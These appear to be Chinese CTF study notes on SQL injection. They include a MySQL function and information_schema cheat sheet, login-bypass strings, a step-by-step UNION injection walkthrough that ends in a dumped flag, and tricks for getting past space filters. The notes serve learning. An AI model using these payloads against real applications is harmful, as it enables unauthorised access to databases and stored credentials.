[师傅笔记先照着模仿吧](https://blog.yanxisishi.top/2026/qingcen_web_02#ezsql%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81)
```
函数：
version()       # 数据库版本
database()      # 当前库名
user()          # 当前用户

length()        # 长度
substr()        # 截取字符  substr(字符串,第几位,1)
ascii()         # 转ASCII码
concat()        # 拼接字符串
group_concat()  # 把多行拼成一行（爆库表必备）

if(a,b,c)       # 真则b，假则c
sleep(n)        # 休眠n秒（时间盲注专用）

核心库：
information_schema
├── schemata   # 所有库名   schema_name
├── tables     # 所有表名   table_name
└── columns    # 所有列名   column_name

查询模板：
# 查所有库
select group_concat(schema_name) from information_schema.schemata;

# 查当前库的表
select group_concat(table_name) from information_schema.tables where table_schema=database();

# 查某表的列
select group_concat(column_name) from information_schema.columns where table_name='表名';

```




# EZSQL
![](TU/image%20copy%202.png)

# 万能密码
Username：`' or 1 = 1 --  `**（注意 -- 前面空格后面还要接一个空白符号，一般用空格，不要用换行）** Password：随意

Username：`admin' -- ` Password：随意

Username：`' or 1 = 1 #`随意Password：

其中 `-- `  和 `# ` 的作用都是行注释。



# EZSQL_1（联合查询注入）

输入：Username：`' or 1 = 1 -- ` Password：随意
只返回了 Welcome admin 
先尝试 Union 联合查询注入 ：
流程：测列数-找回显位-爆库名-爆表名-爆列名-爆数据


```
测列数：
Username：' or 1 = 1 order by 4#Password：随意
回显 Welcome admin 。
Username：' or 1 = 1 order by 5#Password：随意
回显 Login failed. 。
说明列数为 4 。
找回显位：
Username：' UNION SELECT 1,2,3,4#Password：随意
回显 Welcome 2 ，因此 2 所在列数是回显位。
注意： 去掉 Union 后的原语句不能为真，因为本题只会回显查询后得到的第一条数据。
爆库名：
Username：' UNION SELECT 1,database(),3,4#Password：随意
回显 Welcome user ，说明当前库名是 user 。
爆表名：
Username：' UNION SELECT 1,group_concat(table_name),3,4 FROM information_schema.tables WHERE table_schema=database()#Password：随意
回显 Welcome flag ，说明只有一个表 flag 。
爆列名：
Username：' UNION SELECT 1,group_concat(column_name),3,4 FROM information_schema.columns WHERE table_name='flag'#Password：随意
回显 Welcome id,name,passwd,secret ，说明有这 4 列。
爆数据：
Username：' UNION SELECT 1,group_concat(id,name,passwd,secret),3,4 FROM flag#Password：随意
回显 Welcome 1adminadmin123flag{273cca3c-e19f-4273-83e3-59b60980e10a}
```
# EZSQL_2 (与EZSQL_1操作相同)
区别：过滤空格
可以用制表符代替空格    %09 (Tab)、%0b (垂直制表符)、%0c (换页)、%0a (换行)
也可以使用 内联注释 `/**/` 替代空格，但是注意不能替代` --  `中的空格.


# EZSQL_3 (双写绕过)

```
') OR 1=1 #
') UNION SELECT 1,2,3,4 #
') UNION SELECT 1,database(),3,4 #
') UNION SELECT 1,table_name,3,4 FROM information_schema.tables WHERE table_schema=database() #
') UNION SELECT 1,column_name,3,4 FROM information_schema.columns WHERE table_name='flag' #
') UNION SELECT 1,secret,3,4 FROM flag #
```













